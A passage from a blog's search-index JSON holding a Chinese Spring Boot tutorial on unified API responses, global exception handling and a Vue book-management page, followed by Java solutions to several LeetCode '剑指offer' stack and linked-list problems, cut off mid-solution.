\"2022-09-09T12:56:06.549+00:00\",\n    \"status\": 500,\n    \"error\": \"Internal Server Error\",\n    \"path\": \"/getUserName\"\n}\n```\n\n对于上面这几种情况，如果整个项目没有定义统一的返回格式，不同开发人员可能会定义不同的返回格式，这样会使前后端对接出现一些问题。\n\n#### a. 定义返回标准\n\n一个标准的返回格式至少包含3部分：\n\n```\ncode： 状态码\nmessage： 接口调用的提示信息  \ndata： 返回数据\n```\n\n**步骤①**：定义数据返回格式\n\n```java\n@Data\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Result<T> {\n    private int code;\n    private String message;\n    private T data;\n\n    /**\n     * 成功\n     */\n    public static <T> Result<T> success(T data) {\n        Result<T> result = new Result<T>();\n        result.setCode(ResultMsgEnum.SUCCESS.getCode());\n        result.setMessage(ResultMsgEnum.SUCCESS.getMessage());\n        result.setData(data);\n        return result;\n    }\n\n    /**\n     * 失败\n     */\n    public static <T> Result<T> fail(ResultMsgEnum resultMsgEnum) {\n        Result<T> result = new Result<T>();\n        result.setCode(resultMsgEnum.getCode());\n        result.setMessage(resultMsgEnum.getMessage());\n        return result;\n    }\n}\n```\n\n**步骤②**：定义状态码\n\n```java\n@Getter\n@NoArgsConstructor\n@AllArgsConstructor\npublic enum ResultMsgEnum {\n    SUCCESS(0, \"成功\"),\n    FAIL(-1, \"失败\"),\n    TEST_ERROR(400, \"发生错误啦!\");\n    private int code;\n    private String message;\n}\n```\n\n**步骤③**：使用\n\n上面定义了数据返回格式和状态码，下面在接口中使用。\n\n```java\n//示例1\n@GetMapping(\"/getUserName\")\npublic Result getUserName(){\n    return Result.success(\"Hello\");\n}\n\n//示例2\n@GetMapping(\"/getUserName\")\npublic static Result getUserName(){\n  HashMap hashMap = new HashMap();\n  return Result.success(hashMap.get(0).toString()); // 模拟一个空指针异常\n}\n```\n\n返回结果如下\n\n```powershell\n# 示例1结果\n{\n    \"code\": 0,\n    \"message\": \"成功\",\n    \"data\": \"Hello\"\n}\n\n# 示例2结果\n{\n    \"timestamp\": \"2022-09-09T14:45:21.875+00:00\",\n    \"status\": 500,\n    \"error\": \"Internal Server Error\",\n    \"path\": \"/getUserName\"\n}\n```\n\n通过在Controller层调用Result.success()对返回结果进行包装后返回给前端，虽然能够满足日常需求，但是当有大量的接口时，每一个接口中都使用Result.success()来包装返回信息就会增加很多重复代码，而且遇到异常数据格式无法统一。\n\n#### c .统一接口返回\n\n前面步骤不够优雅，可以继续改进，用 **@RestControllerAdvice** 注解，拦截下后端返回的数据，实现 **ResponseBodyAdvice** 接口对数据做一层包装再返回给前端。\n\n> `ResponseBodyAdvice`： 该接口是SpringMVC 4.1提供的，它允许在 执行@ResponseBody后自定义返回数据，用来封装统一数据格式返回；拦截Controller方法的返回值，统一处理返回值/响应体，一般用来统一返回格式，加解密，签名等\n>\n> `@RestControllerAdvice`： 该注解是Controller的增强版，可以全局捕获抛出的异常，全局数据绑定，全局数据预处理。\n\n**步骤①**：新建ResponseAdvice类，该类用于统一封装controller中接口的返回结果。实现ResponseBodyAdvice接口，实现supports、beforeBodyWrite方法。\n\n```java\n@RestControllerAdvice\npublic class ResponseAdvice implements ResponseBodyAdvice<Object> {\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    /**\n     * 是否开启功能 true:开启\n     */\n    @Override\n    public boolean supports(MethodParameter methodParameter, Class<? extends HttpMessageConverter<?>> aClass) {\n        return true;\n    }\n\n    /**\n     * 处理返回结果\n     */\n    @Override\n    public Object beforeBodyWrite(Object o, MethodParameter methodParameter, MediaType mediaType, Class<? extends HttpMessageConverter<?>> aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse) {\n        //处理字符串类型数据\n        if(o instanceof String){\n            try {\n                return objectMapper.writeValueAsString(Result.success(o));\n            } catch (JsonProcessingException e) {\n                e.printStackTrace();\n            }\n        }\n        //返回类型是否已经封装\n        if(o instanceof Result){\n            return o;\n        }\n        return Result.success(o);\n    }\n}\n\n```\n\n**步骤②**：测试，无需转换格式，直接使用\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n  HashMap hashMap = new HashMap();\n  return hashMap.get(0).toString(); // 模拟一个空指针异常\n}\n```\n\n返回结果如下，可以看到返回结果与在Result中定义的参数类型相同。\n\n```powershell\n{\n    \"code\": 0,\n    \"message\": \"成功\",\n    \"data\": {\n        \"timestamp\": \"2022-09-09T14:37:19.902+00:00\",\n        \"status\": 500,\n        \"error\": \"Internal Server Error\",\n        \"path\": \"/getUserName\"\n    }\n}\n```\n\n#### d.全局异常处理\n\n> 遇到异常时，第一时间想到的应该是try…catch，不过这种方式会导致大量代码重复，维护困难等问题，这里不用手写try…catch，由全局异常处理器统一捕获；对于自定义异常，只能通过全局异常处理器来处理，使用全局异常处理器最大的便利就是程序员在写代码时不再需要手写 try…catch了。  \n\n**步骤①**：首先新增一个类，增加`@RestControllerAdvice`注解，如果我们有想要拦截的异常类型，就新增一个方法，使用`@ExceptionHandler`注解修饰，注解参数为目标异常类型。\n\n例如：controller中接口发生Exception异常时，就会进入到Execption方法中进行捕获，将杂乱的异常信息，转换成指定格式后交给ResponseAdvice方法进行统一格式封装并返回给前端。\n\n```java\n@RestControllerAdvice\n@Slf4j\npublic class ExceptionAdvice {\n\n    @ExceptionHandler(Exception.class)\n    public Result Execption(Exception e) {\n        log.error(\"未知异常！\", e);\n        //e.printStackTrace();\n        return Result.fail(ResultMsgEnum.TEST_ERROR);\n    }\n    //还可定义其它拦截异常方法\n    //。。。。。。\n}\n```\n\n**步骤②**：测试，再次调用接口getUserName查看返回结果\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n    HashMap hashMap = new HashMap();\n    return hashMap.get(0).toString(); // 模拟一个空指针异常\n}\n```\n\n返回结果\n\n```powershell\n{\n    \"code\": 400,\n    \"message\": \"发生错误啦!\",\n    \"data\": null\n}\n```\n\n#### e.快速使用\n\n> 前面实现了消息一致性，为了方便使用作如下封装，只需引用到项目中即可\n\n**步骤①**：定义数据返回格式\n\n```java\n@Data\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Result<T> {\n    private int code;\n    private String message;\n    private T data;\n\n    /**\n     * 成功\n     */\n    public static <T> Result<T> success(T data) {\n        Result<T> result = new Result<T>();\n        result.setCode(ResultMsgEnum.SUCCESS.getCode());\n        result.setMessage(ResultMsgEnum.SUCCESS.getMessage());\n        result.setData(data);\n        return result;\n    }\n\n    /**\n     * 失败\n     */\n    public static <T> Result<T> fail(ResultMsgEnum resultMsgEnum) {\n        Result<T> result = new Result<T>();\n        result.setCode(resultMsgEnum.getCode());\n        result.setMessage(resultMsgEnum.getMessage());\n        return result;\n    }\n}\n```\n\n**步骤②**：定义状态码\n\n```java\n@Getter\n@NoArgsConstructor\n@AllArgsConstructor\npublic enum ResultMsgEnum {\n    SUCCESS(0, \"成功\"),\n    FAIL(-1, \"失败\"),\n    TEST_ERROR(400, \"发生错误啦!\");\n    private int code;\n    private String message;\n}\n```\n\n**步骤③：**统一接口\n\n```java\n@RestControllerAdvice\npublic class ResponseAdvice implements ResponseBodyAdvice<Object> {\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    /**\n     * 是否开启功能 true:开启\n     */\n    @Override\n    public boolean supports(MethodParameter methodParameter, Class<? extends HttpMessageConverter<?>> aClass) {\n        return true;\n    }\n\n    /**\n     * 处理返回结果\n     */\n    @Override\n    public Object beforeBodyWrite(Object o, MethodParameter methodParameter, MediaType mediaType, Class<? extends HttpMessageConverter<?>> aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse) {\n        //处理字符串类型数据\n        if(o instanceof String){\n            try {\n                return objectMapper.writeValueAsString(Result.success(o));\n            } catch (JsonProcessingException e) {\n                e.printStackTrace();\n            }\n        }\n        //返回类型是否已经封装\n        if(o instanceof Result){\n            return o;\n        }\n        return Result.success(o);\n    }\n}\n```\n\n**步骤④**：全局异常\n\n```java\n@RestControllerAdvice\n@Slf4j\npublic class ExceptionAdvice {\n\n    @ExceptionHandler(Exception.class)\n    public Result Execption(Exception e) {\n        log.error(\"未知异常！\", e);\n        //e.printStackTrace();\n        return Result.fail(ResultMsgEnum.TEST_ERROR);\n    }\n    //还可定义其它异常方法\n    //。。。。。。\n}\n```\n\n**总结**\n\n1. 设计统一的返回值结果类型便于前端开发读取数据\n\n2. 返回值结果类型可以根据需求自行设定，没有固定格式\n\n3. 返回值结果模型类用于后端与前端进行数据格式统一，也称为前后端数据协议\n\n\n**参考**\n\n- [SpringBoot统一接口返回和全局异常处理](https://blog.csdn.net/qq_47183158/article/details/123440041)\n\n- [统一接口返回和全局异常处理 ](https://juejin.cn/post/7032609987083894814#heading-6)\n\n## 6.页面功能开发\n\n### ⓪前端页面\n\n前端页面下载：https://jwt1399.lanzouv.com/ibQNG0bet3yh\n\n将页面保存到 resources/static目录中，建议执行maven的clean生命周期，避免缓存的问题出现。\n\n如果成功访问：http://127.0.0.1/pages/books.html，即表明接入成功\n\n在进行具体的功能开发之前，先做前后端联通性的测试，通过页面发送异步提交（axios）\n\n```js\n//列表\ngetAll() {\n\taxios.get(\"/books\").then((res)=>{\n\t\tconsole.log(res.data);\n\t});\n},\n```\n\n```js\n//钩子函数，VUE对象初始化完成后自动执行\ncreated() {\n  this.getAll();\n},\n```\n\n只要后台代码能够正常工作，前端能够在日志中接收到数据，就证明前后端是通的，即可进行下一步的功能开发了\n\n**总结**\n\n1. 单体项目中页面放置在resources/static目录下\n2. created钩子函数用于初始化页面时发起调用\n3. 页面使用axios发送异步请求获取数据后确认前后端是否联通\n\n### ①列表功能\n\n列表功能主要操作就是加载完数据，将数据展示到页面上，此处要利用VUE的数据模型绑定，发送请求得到数据，然后页面上读取指定数据即可\n\n**a.页面数据模型定义**\n\n```js\ndata:{\n\tdataList: [],//当前页要展示的列表数据\n\t...\n},\n```\n\n**b.异步请求获取数据**\n\n```js\n//列表\ngetAll() {\n    axios.get(\"/books\").then((res)=>{\n        this.dataList = res.data.data;\n    });\n},\n```\n\n**c.钩子函数调用请求**\n\n```js\n//钩子函数，VUE对象初始化完成后自动执行\ncreated() {\n  this.getAll();\n},\n```\n\n这样在页面加载时就可以获取到数据，并且由VUE将数据展示到页面上了\n\n### ②添加功能\n\n添加功能首先要进行数据收集窗口弹窗的展示，添加后隐藏弹窗即可。因为这个弹窗一直存在，因此当页面加载时首先设置这个弹窗为不可显示状态，需要展示时切换状态即可\n\n**a.表单窗口默认状态**\n\n```js\ndata:{\n\tdialogFormVisible: false,//添加表单是否可见\n\t...\n},\n```\n\n**b.切换为显示状态**\n\n```js\n//弹出添加窗口\nhandleCreate() {\n\tthis.dialogFormVisible = true;\n},\n```\n\n**c.定义清理数据操作**\n\n由于每次添加数据都是使用同一个弹窗录入数据，所以每次操作的痕迹将在下一次操作时展示出来，需要在每次操作之前清理掉上次操作的痕迹\n\n```js\n//重置表单\nresetForm() {\n    this.formData = {};\n},\n```\n\n**d.切换弹窗状态时清理数据**\n\n```js\n//弹出添加窗口\nhandleCreate() {\n    this.dialogFormVisible = true;\n    this.resetForm();\n},\n```\n\n**e.添加操作**\n\n1. 将要保存的数据传递到后台，通过post请求的第二个参数传递json数据到后台\n2. 根据返回的操作结果决定下一步操作\n   - 如果是状态码是成功就关闭添加窗口，显示添加成功的消息\n   - 反之保留添加窗口，显示添加失败的消息\n3. 无论添加是否成功，页面均进行刷新，动态加载数据（对getAll操作发起调用）\n\n```js\n//添加\nhandleAdd () {\n    //发送异步请求\n    axios.post(\"/books\",this.formData).then((res)=>{\n        //如果操作成功，关闭弹层，显示数据\n        if(res.data.code == 0){\n            this.dialogFormVisible = false;\n            this.$message.success(\"添加成功\");\n        }else {\n          \tthis.$message.error(\"添加失败\");\n        }\n    }).finally(()=>{\n        this.getAll();//重载数据，避免添加后数据不显示\n    });\n},\n```\n\n**f.取消添加操作**\n\n```js\n//取消\ncancel(){\n    this.dialogFormVisible = false;\n    this.$message.info(\"操作取消\");\n},\n```\n\n**总结**\n\n1. 请求方式使用POST调用后台对应操作\n2. 添加操作结束后动态刷新页面加载数据\n3. 根据操作结果不同，显示对应的提示信息\n4. 弹出添加表单时清除上次表单数据\n\n### ③删除功能\n\n模仿添加操作制作删除功能，差别之处在于删除操作仅传递一个待删除的数据id到后台即可\n\n**a.删除操作**\n\n```js\n// 删除\nhandleDelete(row) {\n    axios.delete(\"/books/\"+row.id).then((res)=>{\n        if(res.data.flag){\n            this.$message.success(\"删除成功\");\n        }else{\n            this.$message.error(\"删除失败\");\n        }\n    }).finally(()=>{\n        this.getAll();\n    });\n},\n```\n\n**b.删除操作提示信息**\n\n```js\n// 删除\nhandleDelete(row) {\n    //1.弹出提示框\n    this.$confirm(\"此操作永久删除当前数据，是否继续？\",\"提示\",{type:'info'}).then(()=>{\n        //2.删除业务\n        axios.delete(\"/books/\"+row.id).then((res)=>{\n          if(res.data.code == 0){\n            \tthis.$message.success(\"删除成功\");\n          }else {\n            \tthis.$message.error(\"删除失败\");\n          }\n        }).finally(()=>{\n             this.getAll();\n        });\n    }).catch(()=>{\n        //3.取消删除\n        this.$message.info(\"取消删除操作\");\n    });\n}，\t\n```\n\n**总结**\n\n1. 请求方式使用Delete调用后台对应操作\n2. 删除操作需要传递当前行数据对应的id值到后台\n3. 删除操作结束后动态刷新页面加载数据\n4. 根据操作结果不同，显示对应的提示信息\n5. 删除操作前弹出提示框避免误操作\n\n### ④修改功能\n\n修改功能可以说是列表功能、删除功能与添加功能的合体。几个相似点如下：\n\n1. 页面也需要有一个弹窗用来加载修改的数据，这一点与添加相同，都是要弹窗\n\n2. 弹出窗口中要加载待修改的数据，而数据需要通过查询得到，这一点与查询相同，都是要查数据\n\n3. 查询操作需要将要修改的数据id发送到后台，这一点与删除相同，都是传递id到后台\n\n4. 查询得到数据后需要展示到弹窗中，这一点与查询相同，都是要通过数据模型绑定展示数据\n\n5. 修改数据时需要将被修改的数据传递到后台，这一点与添加相同，都是要传递数据\n\n\n**a.查询并展示数据**\n\n```js\n//弹出编辑窗口\nhandleUpdate(row) {\n    axios.get(\"/books/\"+row.id).then((res)=>{\n      if(res.data.code == 0){\n          //展示弹层，加载数据\n          this.formData = res.data.data;\n          this.dialogFormVisibleEdit = true;\n      }else {\n        \tthis.$message.error(\"数据同步失败\");\n      }\n    });\n},\n```\n\n**b.修改操作**\n\n```js\n//修改\nhandleEdit() {\n    axios.put(\"/books\",this.formData).then((res)=>{\n        //如果操作成功，关闭弹层并刷新页面\n      if(res.data.code == 0){\n          this.dialogFormVisibleEdit = false;\n          this.$message.success(\"修改成功\");\n      }else {\n        \tthis.$message.error(\"修改失败\");\n      }\n    }).finally(()=>{\n       \t this.getAll();\n    });\n},\n```\n\n**c.取消修改操作**\n\n```js\n//取消\ncancel(){\n    this.dialogFormVisible = false;\n  \tthis.dialogFormVisibleEdit = false;\n \t  this.$message.info(\"操作取消\");\n},\n```\n\n**总结**\n\n1. 加载要修改数据通过传递当前行数据对应的id值到后台查询数据\n2. 利用前端双向数据绑定将查询到的数据进行回显\n3. 请求方式使用PUT调用后台对应操作\n4. 修改操作结束后动态刷新页面加载数据\n5. 根据操作结果不同，显示对应的提示信息\n\n### ⑤分页功能\n\n分页功能的制作用于替换前面的查询全部，\n\n**a.ElementUI分页组件**\n\n```html\n<!--分页组件-->\n<div class=\"pagination-container\">\n    <el-pagination\n     class=\"pagiantion\"\n     @current-change=\"handleCurrentChange\"\n     @size-change=\"handleSizeChange\"\n     :current-page=\"pagination.currentPage\"\n     :page-size=\"pagination.pageSize\"\n     layout=\"total,sizes, prev, pager, next, jumper\"\n     :page-sizes=\"[5, 10, 15, 20]\"\n     :total=\"pagination.total\">\n    </el-pagination>\n</div>\n```\n\n**b.配合分页组件，封装分页对应的数据模型**\n\n```js\ndata:{\n  //分页相关模型数据\n\tpagination: {\t\n\t\tcurrentPage: 1,\t//当前页码\n\t\tpageSize:10,\t //每页显示的记录数\n\t\ttotal:0,\t\t  //总记录数\n\t}\n},\n```\n\n**c.修改查询全部功能为分页查询，通过路径变量传递页码信息参数**\n\n```js\ngetAll() {\n    axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize)\n        .then((res)=>{\n            console.log(res.data.data);\n    \t});\n},\n\n```\n\n**d.页面根据分页操作结果读取对应数据，并进行数据模型绑定**\n\n```js\ngetAll() {\n    axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize)\n      \t.then((res)=>{\n            //console.log(res.data.data);\n      \t\t\tthis.dataList = res.data.data.records;\n            this.pagination.currentPage = res.data.data.current;\n            this.pagination.pageSize = res.data.data.size;\n            this.pagination.total = res.data.data.total;      \n    \t})\n},\n```\n\n**f.对切换页码操作设置调用当前分页操作**\n\n```js\n//切换页码\nhandleCurrentChange(currentPage) {\n    this.pagination.currentPage = currentPage;\n    this.getAll();\n},\n```\n\n**g.对切换每页显示条数操作设置调用当前记录数操作**\n\n```js\n//切换每页条数\nhandleSizeChange(pageSize){\n    this.pagination.pageSize = pageSize;\n    this.getAll();\n}\n```\n\n**总结**\n\n1. 使用el分页组件\n2. 定义分页组件绑定的数据模型\n3. 异步调用获取分页数据\n4. 分页数据页面回显\n\n### ⑥删除功能维护\n\n由于使用了分页功能，当最后一页只有一条数据时，删除操作就会出现BUG，最后一页无数据但是独立展示，对分页查询功能进行后台功能维护，如果当前页码值大于最大页码值，重新执行查询。其实这个问题解决方案很多，这里给出比较简单的一种处理方案\n\n```java\n@GetMapping(\"{currentPage}/{pageSize}\")\npublic IPage<Book> getPage(@PathVariable int currentPage, @PathVariable int pageSize){\n    IPage<Book> page = bookService.getPage(currentPage, pageSize);\n    //如果当前页码值大于了总页码值，那么重新执行查询操作，使用最大页码值作为当前页码值\n    if( currentPage > page.getPages()){\n      \tpage = bookService.getPage((int)page.getPages(), pageSize);\n    }\n    return page;\n}\n```\n\n删除一条数据之后，主键id不连续的问题解决\n\n```sql\n#删除id列\nalter table tbl_book drop id; \n#新增id列,设为主键,并自增\nALTER TABLE tbl_book ADD id INT NOT NULL PRIMARY KEY AUTO_INCREMENT FIRST; \n```\n\n### ⑦条件查询\n\n条件查询可以理解为分页查询的时候除了携带分页数据再多带几个数据的查询。这些多带的数据就是查询条件。\n\n页面发送请求时，两个分页数据仍然使用路径变量，其他条件采用动态拼装url参数的形式传递\n\n**a.页面封装查询条件字段**\n\n```js\npagination: {\t\t\n//分页相关模型数据\n\tcurrentPage: 1,\t\t//当前页码\n\tpageSize:10,\t\t//每页显示的记录数\n\ttotal:0,\t\t\t//总记录数\n\tname: \"\",\n\ttype: \"\",\n\tdescription: \"\"\n},\n```\n\n**b.页面添加查询条件字段对应的数据模型绑定名称**\n\n```html\n<div class=\"filter-container\">\n    <el-input placeholder=\"图书类别\" v-model=\"pagination.type\" class=\"filter-item\"/>\n    <el-input placeholder=\"图书名称\" v-model=\"pagination.name\" class=\"filter-item\"/>\n    <el-input placeholder=\"图书描述\" v-model=\"pagination.description\" class=\"filter-item\"/>\n    <el-button @click=\"getAll()\" class=\"dalfBut\">查询</el-button>\n    <el-button type=\"primary\" class=\"butT\" @click=\"handleCreate()\">新建</el-button>\n</div>\n```\n\n**c.将查询条件组织成url参数，添加到请求url地址中**\n\n```js\ngetAll() {\n  //1.获取查询条件,拼接查询条件\n  param = \"?name=\"+this.pagination.name;\n  param += \"&type=\"+this.pagination.type;\n  param += \"&description=\"+this.pagination.description;\n  //console.log(param);\n  axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize+param)\n    .then((res)=>{\n    //console.log(res.data.data);\n    this.pagination.currentPage = res.data.data.current;\n    this.pagination.pageSize = res.data.data.size;\n    this.pagination.total = res.data.data.total;\n    this.dataList = res.data.data.records;\n  })\n},\n```\n\n**d.后台代码中定义实体类封查询条件**\n\n```java\n@GetMapping(\"{currentPage}/{pageSize}\")\npublic IPage<Book> getPage(@PathVariable int currentPage, @PathVariable int pageSize,Book book){\n    System.out.println(\"参数=====>\"+book);\n    IPage<Book> page = bookService.getPage(currentPage, pageSize, book);\n    //如果当前页码值大于了总页码值，那么重新执行查询操作，使用最大页码值作为当前页码值\n    if( currentPage > page.getPages()){\n      \tpage = bookService.getPage((int)page.getPages(), pageSize, book);\n    }\n    return page;\n}\n```\n\n**e.对应业务层接口与实现类进行修正**\n\n```java\npublic interface BookService {\n    IPage<Book> getPage(int currentPage,int pageSize,Book book);\n}\n```\n\n```java\n@Service\npublic class BookServiceImpl  implements BookService {\n  @Override\n  public IPage<Book> getPage(int currentPage, int pageSize, Book book) {\n      IPage page = new Page(currentPage,pageSize);\n      LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n      lqw.like(Strings.isNotEmpty(book.getName()),Book::getName,book.getName());\n      lqw.like(Strings.isNotEmpty(book.getType()),Book::getType,book.getType());\nlqw.like(Strings.isNotEmpty(book.getDescription()),Book::getDescription,book.getDescription());\n      return bookDao.selectPage(page,lqw);\n    }\n}\n```\n\n**总结**\n\n1. 定义查询条件数据模型（当前封装到分页数据模型中）\n2. 异步调用分页功能并通过请求参数传递数据到后台\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"LeetCode-剑指offer","url":"/posts/26733.html","content":"\n首刷剑指offer，刷起来还是比较吃力，大多数题需要看题解才能做出来，甚至有的看了题解都不懂😭，我是废物，希望第二次刷的时候大部分题都能自己做出来吧！！！\n\n\n\n# 剑指Offer\n\n| 简单 | 中等 | 困难 |\n| :--: | :--: | :--: |\n| 38道 | 31道 | 6道  |\n\n# 第 1 天 栈与队列\n\n## 09. 用两个栈实现队列\n\n### 题目\n\n> 用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )\n> ```bash\n> 示例 1：\n> 输入：\n> [\"CQueue\",\"appendTail\",\"deleteHead\",\"deleteHead\"]\n> [[],[3],[],[]]\n> 输出：[null,null,3,-1]\n> \n> 示例 2：\n> 输入：\n> [\"CQueue\",\"deleteHead\",\"appendTail\",\"appendTail\",\"deleteHead\",\"deleteHead\"]\n> [[],[],[5],[2],[],[]]\n> 输出：[null,-1,null,null,5,2]```\n\n### 解答\n\n- 成员变量：维护两个栈 inStack 和 outStack，其中 inStack 支持队首插入(appendTail)操作，outStack 支持队尾删除(deleteHead)操作\n- 构造方法（CQueue）：初始化 inStack 和 outStack 为空\n- 队首插入元素（appendTail）：inStack 直接插入元素\n- 队尾删除元素（deleteHead）：\n  - **当 outStack 不为空**： outStack 中仍有已完成倒序的元素，因此直接返回 outStack 的栈顶元素。\n  - **当 outStack 为空，inStack为空：** 即两个栈都为空，无元素，因此返回 -1 。\n  - **当 outStack 为空， inStack不为空，**：将 inStack 里的所有元素弹出插入到 outStack 里，实现元素倒序，并返回栈 outStack 的栈顶元素。\n\n```java\nclass CQueue {\n    //两个栈，一个出栈，一个入栈\n    Stack<Integer> inStack;\n    Stack<Integer> outStack;\n    \n    public CQueue() {\n        // 初始化栈\n        inStack = new Stack<>();\n        outStack = new Stack<>();\n    }\n    \n    public void appendTail(int value) {\n        inStack.push(value);\n    }\n    \n    public int deleteHead() {\n        if(!outStack.isEmpty()){\n            return outStack.pop();\n        }\n        else{\n            if (inStack.isEmpty()){\n                return -1;\n            }\n            //将inStack的所有值放入outStack\n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n            return outStack.pop();\n        }\n    }\n}\n```\n\n## 30. 包含min函数的栈\n\n### **题目**\n\n> 定义栈的数据结构，请在该类型中实现一个能够得到栈的最小元素的 min 函数在该栈中，调用 min、push 及 pop 的时间复杂度都是 O(1)。\n>```bash\n示例:\nMinStack minStack = new MinStack();\nminStack.push(-2);\nminStack.push(0);\nminStack.push(-3);\nminStack.min();   --> 返回 -3.\nminStack.pop();\nminStack.top();   --> 返回 0.\nminStack.min();   --> 返回 -2.\n\n### **解答**\n\n本题难点：将 min() 函数复杂度降为 O(1) ，可通过建立辅助栈实现；设定一个辅助栈，栈顶表示当前数据栈中的最小值，每次有新元素入栈，就将当前最小值入辅助栈。出栈时，辅助栈也要将栈顶元素出栈，这就解决了出栈时的最小值更新问题。\n\n```java\nclass MinStack {\n     Stack<Integer> dataStack; // 数据栈\n     Stack<Integer> minStack; // 辅助栈，记录每次有元素进栈后或者出栈后，元素的最小值\n    public MinStack() {\n        // 初始化辅助栈和数据栈\n        dataStack = new Stack<>();\n        minStack = new Stack<>();\n    }\n    public void push(int x) {\n        dataStack.push(x);// 数据栈，进栈\n        // 如果辅助栈为空，或者辅助栈栈顶 > x，则将 x 设置为最小值，即进辅助栈\n        if(minStack.isEmpty() || minStack.peek() > x){\n            minStack.push(x);\n        }else{// 如果辅助栈栈顶 < x, 则继续将上次的最小值再入一次辅助栈\n            minStack.push(minStack.peek());\n        }  \n    }\n\n    public void pop() {\n        minStack.pop();// 辅助栈，出栈\n        dataStack.pop();// 数据栈，出栈\n    }\n\n    public int top() {\n        return dataStack.peek();\n    }\n\n    public int min() {\n        return minStack.peek();\n    }\n}\n```\n\n# 第 2 天 链表\n\n## 06. 从尾到头打印链表\n\n### **题目**\n\n> 输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。\n>```\n示例 1：\n输入：head = [1,3,2]\n输出：[2,3,1]\n\n### **解答**\n\n栈的特点是后进先出，考虑到栈的这一特点，使用栈将链表元素顺序倒置。\n创建一个栈，将链表的节点都压入该栈，获得栈的大小 size，创建一个数组 out，其大小为 size，从栈内弹出一个节点，将该节点的值存到 out 当中，最后返回 out 。\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public int[] reversePrint(ListNode head) {\n        Stack<ListNode> stack = new Stack<ListNode>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        int size = stack.size();\n        int out[] = new int[size];\n        for(int i = 0; i < size; i++){\n            out[i] = stack.pop().val;\n        }\n        return out;\n    }\n}\n```\n\n## 24. 反转链表\n\n### **题目**\n\n> 定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。\n>```\n示例:\n输入: 1->2->3->4->5->NULL\n输出: 5->4->3->2->1->NULL\n\n### **解答**\n\n#### 方法1：迭代（双指针）\n\n定义两个指针 pre 和 cur ，在遍历链表时，将当前节点（cur）的 next 指针改为指向前一个节点（pre），完成一次局部反转。指向前一个节点后，与后一节点的联系就断了，因此在更改引用之前，还需要存储后一个节点（temp）。然后 pre 和 cur 同时往后移动一个位置。最后返回新的头引用。\n\n| ![](https://img.jwt1399.top/img/202207281850178.png) | ![](https://img.jwt1399.top/img/202207281850724.png) | ![](https://img.jwt1399.top/img/202207281850147.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null, cur = head; //初始化pre和cur分别指向null和头节点\n        while(cur != null) {\n          \tListNode temp = cur.next; // 暂存后继节点 cur.next\n            cur.next = pre;           // 修改 next 引用指向\n            pre = cur;                // pre 暂存 cur，即 pre 移动到下一个节点\n            cur = temp;               // cur 访问下一节点\n        }\n        return pre;                   // 返回新的头引用\n    }\n}\n```\n\n#### 方法2：递归\n\n使用递归法遍历链表，当越过尾节点后终止递归，在回溯时修改各节点的 `next` 引用指向。\n\n- 终止条件：当前节点和后继为空，则返回尾节点  （即反转链表的头节点）；\n\n- 使用递归函数，一直递归到链表的最后一个结点，该结点就是反转后的头结点，记作 rehead\n\n- 此后，每次函数在返回的过程中，让当前结点的下一个结点的 next 指针指向当前节点。\n\n- 同时让当前结点的 next 指针指向 NULL ，从而实现从链表尾部开始的局部反转\n\n- 当递归函数全部出栈后，链表反转完成，返回反转链表的头节点 rehead ；\n\n```java\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        if(head == null || head.next == null) {// 终止条件\n            return head;\n        }\n        ListNode rehead = reverseList(head.next); // 递归后继节点\n        head.next.next = head; // 修改节点引用指向\n        head.next = null;\n        return rehead;// 返回反转链表的头节点\n    }\n}\n```\n\n## 35. 复杂链表的复制\n\n### 题目\n\n>请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。\n>\n>**示例 1：**\n>\n>```\n>输入：head = [[7,null],[13,0],[11,4],[10,2],[1,0]]\n>输出：[[7,null],[13,0],[11,4],[10,2],[1,0]]\n>```\n>\n>**示例 2：**\n>\n>```\n>输入：head = [[1,1],[2,1]]\n>输出：[[1,1],[2,1]]\n>```\n>示例 3：\n>\n>```\n>输入：head = [[3,null],[3,0],[3,null]]\n>输出：[[3,null],[3,0],[3,null]]\n>```\n>\n>示例 4：\n>\n>```\n>输入：head = []\n>输出：[]\n>解释：给定的链表为空（空指针），因此返回 null。\n>```\n\n### 解答\n\n#### 方法1：哈希表/Map\n\n**算法流程：**\n\n- **1.**若头结点 